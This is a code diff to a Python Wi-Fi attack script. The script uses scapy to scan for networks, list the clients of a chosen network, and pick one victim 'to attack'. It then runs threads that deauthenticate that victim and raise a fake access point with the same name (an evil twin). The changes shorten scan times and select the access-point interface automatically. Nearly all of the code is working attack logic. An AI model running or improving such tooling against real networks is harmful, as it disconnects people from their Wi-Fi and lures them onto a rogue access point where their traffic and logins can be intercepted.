@@ -4,8 +4,7 @@ import csv
 import subprocess
 # import scapy.all as scapy
 from scapy.layers.l2 import ARP, Ether
-from WifiAdapter import MonitorMode
-from WifiAdapter import WifiAdapterFinder
+from WifiAdapter import *
 import Deauthenticate
 import create_ap
 from scapy import all as sc
@@ -15,11 +14,13 @@ from threading import Thread
 
 
 
+
 AvialableWifiNetworks = []
 Clients = []
 ChosenWifiMA = ""
 ChosenWifiSSID = ""
 WifiAdapter = ""
+
 
 
 def PacketHendler(packet):
@@ -39,12 +40,14 @@ def PacketHendler(packet):
 
 
 
+
 #  WifiAdapter = selected interface
 def WifiNetworksFinder():
     print("\nScanning for avialable wireless netwroks...\n")
     #  iface = the interfaces that we would like to sniff on
     # prn = allows us to pass a function that executes with each packet sniffed
-    sc.sniff(iface=WifiAdapter, prn=PacketHendler , timeout = 40)
+    sc.sniff(iface=WifiAdapter, prn=PacketHendler , timeout = 10)
+
 
     # printing the Available Wifi Networks withe their ssid(name) and their mac address
     print("\n\n\nThe Available Wifi Networks are:\n")
@@ -64,9 +67,10 @@ def WifiNetworksFinder():
     return [ChosenWifiMA , ChosenWifiSSID]
 
 
+
 def ClientsFinder():
     print("\nScanning for clients...\n")
-    sc.sniff(iface=WifiAdapter, prn=CLientsSniffing , timeout = 40)
+    sc.sniff(iface=WifiAdapter, prn=CLientsSniffing , timeout = 10)
     print("\n\n\nThe Clients who connected to the chosen wifi are:\n")
     for index, item in enumerate(Clients):
         print(f"{index} MAC Address : {item} ,")
@@ -81,6 +85,7 @@ def ClientsFinder():
     return Clients[int(Chosen_Client)]
 
 
+
 def CLientsSniffing(pkt):
     stamgmtstypes = (0, 2, 4)
     # Make sure the packet has the Scapy Dot11 layer present
@@ -93,14 +98,16 @@ def CLientsSniffing(pkt):
         #         print(pkt.summary())
         #         if pkt.info not in Clients:
         #             Clients.append(pkt.info)
-        if pkt.addr2 not in AvialableWifiNetworks and pkt.addr3 == ChosenWifiMA and pkt.addr2 not in Clients and pkt.addr2 != ChosenWifiMA:
+        if pkt.addr3 == ChosenWifiMA and pkt.addr2 not in Clients and pkt.addr2 != ChosenWifiMA:
             Clients.append(pkt.addr2)
             # print(len(Clients),"     " ,pkt.addr2)
 
 
 
 
+
 if __name__ == "__main__":
+
 
     #finding wifi adapter
     WifiAdapter = WifiAdapterFinder()
@@ -112,21 +119,29 @@ if __name__ == "__main__":
     ChosenWifiSSID = wifi_details[1]
     #finding a specific client of the chosen wifi network to attack
     ChosenClient=ClientsFinder()
+    APInterface = FindInterafaceForAP()
+
 
 
     print("wifi adapter is : " , WifiAdapter)
+    print("AP interface is : " , APInterface)
     print("chosen wifi mac address is : " , ChosenWifiMA)
     print("chosen wifi ssid is : " , ChosenWifiSSID)
-    print("chosen client mac address is : " , ChosenWifiSSID)
+    print("chosen client mac address is : " , ChosenClient)
     #create thread that disconnect the victim from the chosen wifi 
     Deauthenticate_thread = Thread(target=Deauthenticate.deautenticate_user,args=[WifiAdapter,ChosenWifiMA,ChosenClient])
 
+
     #create thread that create an fake wireless network (evil twin)
-    TwinNet_thread = Thread(target = create_ap.prepare_fake_access_point, args = ["enp2s0", ChosenWifiSSID])
+    TwinNet_thread = Thread(target = create_ap.prepare_fake_access_point, args = [APInterface, ChosenWifiSSID])
+
 
     Deauthenticate_thread.start()
     TwinNet_thread.start()
 
+
     TwinNet_thread.join()
     Deauthenticate_thread.join()
+
+
 
